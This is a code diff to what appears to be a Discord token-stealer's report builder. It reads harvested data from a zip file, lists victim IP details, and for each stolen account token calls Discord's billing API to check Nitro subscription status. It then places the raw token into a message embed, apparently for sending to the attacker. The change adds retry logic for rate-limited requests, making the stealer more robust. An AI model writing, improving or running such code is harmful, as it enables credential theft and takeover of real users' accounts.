@@ -41,13 +41,25 @@ const json = async (zipFile) => {
       ipInfoFields.map(i => `**${i[0]}:** ${i[1]}`).join('\n')
   });
 
-  if (discordAccountInfo.accounts && discordAccountInfo.accounts.length > 0) {
+  if (discordAccountInfo.accounts?.length >= 1) {
     for (const account of discordAccountInfo.accounts) {
       const haveNitro = account.premium_type !== 0;
-      const nitroSubscriptionEnd = haveNitro &&
-        Math.floor(new Date((await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
-          headers: { Authorization: account.token, 'User-Agent': userAgent }
-        })).data[0]?.current_period_end).getTime() / 1000);
+      let nitroSubscriptionEnd = 0;
+      if (haveNitro) {
+        try {
+          const request = await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
+            headers: { Authorization: account.token, 'User-Agent': userAgent }
+          });
+          nitroSubscriptionEnd = Math.floor(new Date(request.data[0]?.current_period_end).getTime() / 1000);
+        } catch (err) {
+          await sleep((err.data?.response?.retry_after * 1000) + 500);
+          const request = await axios.get('https://discord.com/api/v10/users/@me/billing/subscriptions', {
+            headers: { Authorization: account.token, 'User-Agent': userAgent }
+          });
+          nitroSubscriptionEnd = Math.floor(new Date(request.data[0]?.current_period_end).getTime() / 1000);
+        }
+      }
+
       embeds.push({
         description: `Token: ${codeBlock(account.token)}`,
         author: {
